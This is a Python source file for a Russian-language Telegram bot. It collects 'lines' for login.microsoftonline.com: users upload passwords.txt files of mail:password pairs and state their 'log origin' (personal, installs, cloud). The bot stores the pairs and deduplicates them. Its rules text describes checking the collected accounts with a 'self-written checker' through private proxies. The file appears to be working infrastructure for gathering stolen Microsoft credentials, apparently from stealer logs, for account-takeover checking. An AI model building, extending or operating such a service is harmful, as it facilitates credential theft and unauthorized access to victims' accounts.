from __future__ import annotations

import tempfile
from pathlib import Path

from telegram import KeyboardButton, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from .config import Settings, load_settings
from .importers import import_text_blob, import_txt_file
from .storage import HashStore


async def welcome(name: str) -> str:
    return f"""🤚🏻 Добро пожаловать, {name},
Это бот по по приему строк Login.microsoftonline.com
Надеюсь мы с тобой отлично сработаемся!"""


async def req_welcome(name: str) -> str:
    return f"""<b>🙋🏼 Добро пожаловать, {name},
Для того , что бы начать работать с нами тебе нужно подтвердить , что ты не робот. Отправь мне свою заявку  по шаблону ниже.</b>

1. Твоя ссылка на профиль профиль
(если его нет , то пиши минус)
2. Укажи происхождение своих логов
(личные, инсталы, название клауда)"""


REQ_ACCESS_PROFILE = """Введите ссылку на профиль"""
REQ_ACCESS_ORIGIN = """Укажите происхождение логов"""
REQ_ACCESS_COMPLETE = """Заявка отправлена на рассмотрение"""
REQ_ACCESS_ON_HOLD = """Ваша заявка находится на рассмотрении"""
REQ_ACCESS_ON_ACCEPTED = """Ваша заявка принята"""

SUPPORT = """📞 Тех поддержка - @rezer_2281
Постараемся решить вашу проблему !"""

RULES = """❗️ Правила
При использовании данного бота, вы соглашаетесь на то, что мы выполняем свою работу корректно.
В дополнении согласны с тем, что результаты после проверки — верные.
Оскорбления в адрес бота или нас — бан в боте.

Бот бесплатный.
Отработка строк происходит следующим образом:
1. Бот принимает ваши строки и сверяет их на уникальность в нашей базе.
2. С помощью регулярок в notepad++ удаляются не нужные строки.
3. Проверка самописным чекером с приватными прокси.

Если у вас остались вопросы — @rezer_2281"""

MANUAL = """Содержание:
Описание кнопок, мануал по сортировке и загрузке файлов"""

SEND_TEXT_FILE = """Отправьте мне Текстовый документ с аккаунтами в формате:  mail:password."""
SEND_FILE_LINK = """Пожалуйста загрузите ваши passwords.txt"""
WAIT_FOR_CHECK = """❗️ Проверяю строки на уникальность...
После этого сообщения выдам результаты."""


async def added_balance(unique_count: int) -> str:
    return f"""Ваш файл был обработан.
Уникальных строк: {unique_count}
Бот бесплатный — спасибо что работаете с нами!
"""


def _main_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton("📝 Подать заявку"), KeyboardButton("📜 Правила")],
            [KeyboardButton("🛟 Поддержка"), KeyboardButton("📘 Мануал")],
            [KeyboardButton("📂 Загрузить файл"), KeyboardButton("📊 Статистика")],
            [KeyboardButton("🔍 Проверить строку")],
        ],
        resize_keyboard=True,
    )


def _store(ctx: ContextTypes.DEFAULT_TYPE) -> HashStore:
    return ctx.application.bot_data["store"]


def _settings(ctx: ContextTypes.DEFAULT_TYPE) -> Settings:
    return ctx.application.bot_data["settings"]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    name = update.effective_user.first_name if update.effective_user else "пользователь"
    await update.message.reply_text(await welcome(name), reply_markup=_main_keyboard())
    await update.message.reply_html(await req_welcome(name))


async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    stat = _store(context).stat()
    await update.message.reply_text(
        "\n".join(
            [
                f"Entries: {stat['entries']}",
                f"Map size: {stat['map_size']}",
                f"Last page: {stat['last_pgno']}",
            ]
        )
    )


async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = " ".join(context.args).strip()
    if not query:
        await update.message.reply_text("Использование: /check <строка>")
        return

    exists = _store(context).contains(query)
    await update.message.reply_text("✅ Найдено" if exists else "❌ Не найдено")


async def add(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    value = " ".join(context.args).strip()
    if not value:
        await update.message.reply_text("Использование: /add <строка>")
        return

    inserted = _store(context).insert_one(value)
    if inserted:
        await update.message.reply_text("✅ Добавлено")
    else:
        await update.message.reply_text("⚠️ Пустая строка или уже существует")


async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (update.message.text or "").strip()
    if not text:
        return

    step = context.user_data.get("step")
    if step == "await_profile":
        context.user_data["request_profile"] = text
        context.user_data["step"] = "await_origin"
        await update.message.reply_text(REQ_ACCESS_ORIGIN)
        return

    if step == "await_origin":
        context.user_data["request_origin"] = text
        context.user_data["step"] = None
        context.user_data["request_status"] = "on_hold"
        await update.message.reply_text(f"{REQ_ACCESS_COMPLETE}\n{REQ_ACCESS_ON_HOLD}")
        return

    if step == "await_check_query":
        context.user_data["step"] = None
        exists = _store(context).contains(text)
        await update.message.reply_text("✅ Найдено" if exists else "❌ Не найдено")
        return

    if text == "📝 Подать заявку":
        status = context.user_data.get("request_status")
        if status == "accepted":
            await update.message.reply_text(REQ_ACCESS_ON_ACCEPTED)
            return
        if status == "on_hold":
            await update.message.reply_text(REQ_ACCESS_ON_HOLD)
            return
        context.user_data["step"] = "await_profile"
        await update.message.reply_text(REQ_ACCESS_PROFILE)
        return

    if text == "📜 Правила":
        await update.message.reply_text(RULES)
        return

    if text == "🛟 Поддержка":
        await update.message.reply_text(SUPPORT)
        return

    if text == "📘 Мануал":
        await update.message.reply_text(MANUAL)
        return

    if text == "📂 Загрузить файл":
        await update.message.reply_text(f"{SEND_TEXT_FILE}\n{SEND_FILE_LINK}")
        return

    if text == "📊 Статистика":
        await stats(update, context)
        return

    if text == "🔍 Проверить строку":
        context.user_data["step"] = "await_check_query"
        await update.message.reply_text("Отправьте строку для проверки")
        return

    if "\n" not in text:
        exists = _store(context).contains(text)
        await update.message.reply_text("✅ Найдено" if exists else "❌ Не найдено")
        return

    report = import_text_blob(_store(context), text, batch_size=_settings(context).import_batch_size)
    await update.message.reply_text(
        f"Импорт завершён. Строк: {report.total_lines}, добавлено: {report.inserted}, пустых: {report.skipped_empty}."
    )


async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc = update.message.document
    if not doc:
        return

    max_size = _settings(context).max_file_size_mb * 1024 * 1024
    if doc.file_size and doc.file_size > max_size:
        await update.message.reply_text(f"Файл слишком большой. Лимит: {_settings(context).max_file_size_mb}MB")
        return

    filename = doc.file_name or "upload.txt"
    if not filename.lower().endswith(".txt"):
        await update.message.reply_text("Поддерживаются только .txt файлы")
        return

    with tempfile.TemporaryDirectory() as tmpdir:
        path = Path(tmpdir) / filename
        telegram_file = await context.bot.get_file(doc.file_id)
        await telegram_file.download_to_drive(str(path))

        report = import_txt_file(
            _store(context),
            path,
            batch_size=_settings(context).import_batch_size,
        )

    await update.message.reply_text(WAIT_FOR_CHECK)
    await update.message.reply_text(await added_balance(report.inserted))


async def post_init(app: Application) -> None:
    settings = load_settings()
    app.bot_data["settings"] = settings
    app.bot_data["store"] = HashStore(settings.db_path)


async def post_shutdown(app: Application) -> None:
    store: HashStore | None = app.bot_data.get("store")
    if store:
        store.close()


def build_app() -> Application:
    settings = load_settings()
    app = (
        Application.builder()
        .token(settings.bot_token)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("check", check))
    app.add_handler(CommandHandler("add", add))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    return app


def main() -> None:
    app = build_app()
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
